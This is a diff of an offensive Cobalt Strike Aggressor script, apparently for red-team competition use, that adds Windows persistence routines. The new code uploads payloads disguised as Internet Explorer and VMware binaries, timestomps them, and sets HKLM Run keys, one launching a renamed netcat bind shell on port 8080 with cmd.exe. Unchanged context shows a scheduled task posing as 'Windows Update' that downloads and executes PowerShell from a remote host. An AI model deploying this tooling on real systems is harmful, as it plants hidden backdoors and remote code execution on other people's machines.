@@ -2,8 +2,8 @@
 # Created by @jgaudard  :: I don't twitter much
 # Aggressor script for persistence
 # !!! Must create executables for upload. !!!
-# Created: 3 March 2017 Modified: 27 Mar 2017
-# Version 2.0
+# Created: 3 March 2017 Modified: 28 Mar 2017
+# Version 2.1
 #
 # References: 
 # https://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/
@@ -57,7 +57,45 @@ sub persist_diagsvc {
         }
     }    
 }
-
+sub persist_runkey_ie {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("jsdbgui.exe")) {
+            blog($1, "Setting up run key persistence for jsdbgui.exe");
+            bcd($1, 'c:\\program files\\internet explorer');
+            bupload($1, script_resource("jsdbgui.exe"));
+            btimestomp($1, "jsdbgui.exe", "jsdbgui.dll");
+            bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java Script Debug GUI" /t REG_SZ /d "C:\Program Files\Internet Explorer\jsdbgui.exe" /f');
+        }
+        else {
+            berror($1, "jsdbgui.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("jsdbgui32.exe")) {
+            blog($1, "Setting up run key persistence for jsdbgui.exe");
+            bcd($1, 'c:\\program files\\internet explorer');
+            bupload($1, script_resource("jsdbgui32.exe"));
+            bshell($1, "move c:\\program files\\internet explorer\\jsdbgui32.exe c:\\program files\\internet explorer\\jsdbgui.exe");
+            btimestomp($1, "jsdbgui.exe", "jsdbgui.dll");
+            bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java Script Debug GUI" /t REG_SZ /d "C:\Program Files\Internet Explorer\jsdbgui.exe" /f');
+        }
+        else {
+            berror($1, "jsdbgui32.exe does not exist :(");
+        }
+    }    
+}
+sub persist_runkey_netcat {
+    if (-exists script_resource("vmtools.exe")) {
+        blog($1, "Setting up run key persistence for vmtools.exe");
+        bcd($1, 'c:\\program files\\vmware\\vmware tools');
+        bupload($1, script_resource("vmtools.exe"));         ### copy /usr/share/windows-binaries/nc.exe to script directory
+        btimestomp($1, "vmtools.exe", "vmtoolsd.exe");
+        bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VMware Tools" /t REG_SZ /d "C:\Program Files\Internet Explorer\vmtools.exe -lp 8080 -e cmd.exe" /f');
+    }
+    else {
+        berror($1, "vmtools.exe does not exist :(");
+    }
+}
 sub persist_scorebot {
     if (beacon_info($1, 'is64') == 1) {
         if (-exists script_resource("scorebot.exe")) {
@@ -108,7 +146,7 @@ sub persist_linkinfo {
             blog($1, "Setting up linkinfo.dll persistence.");
             bcd($1, 'c:\windows');
             bupload($1, script_resource("linkinfo32.dll"));
-            bshell($1, "move c:\windows\linkinfo32.dll c:\windows\linkinfo.dll");
+            bshell($1, "move c:\\windows\\linkinfo32.dll c:\\windows\\linkinfo.dll");
             btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
         }
         else {
@@ -133,7 +171,7 @@ sub persist_unquotepath {
             blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
             bcd(($1, 'c:\');
             bupload($1, script_resource("program32.exe"));
-            bshell($1, "move c:\program32.exe c:\program.exe");
+            bshell($1, "move c:\\program32.exe c:\\program.exe");
             btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
         }
         else {
@@ -141,7 +179,6 @@ sub persist_unquotepath {
         }
     }
 }
-
 sub persist_schjob {
     bshell($1, 'schtasks /create /TN "Windows Update" /SC ONLOGON /TR "powershell -nop -c \"IEX ((new-object net.webclient).downloadstring(\'http://192.168.133.7:80/a\'))\"');
     }
@@ -166,6 +203,18 @@ popup beacon_top {
                 persist_diagsvc($bid);
             }
         }
+        item "Persist (runkey_ie)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_runkey_ie($bid);
+            }
+        }    
+        item "Persist (runkey_netcat)" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_runkey_netcat($bid);
+            }
+        }         
         item "Sticky Keys" {
             local('$bid');
             foreach $bid ($1) {
@@ -185,4 +234,4 @@ popup beacon_top {
             }
         }
     }
-}
+}    
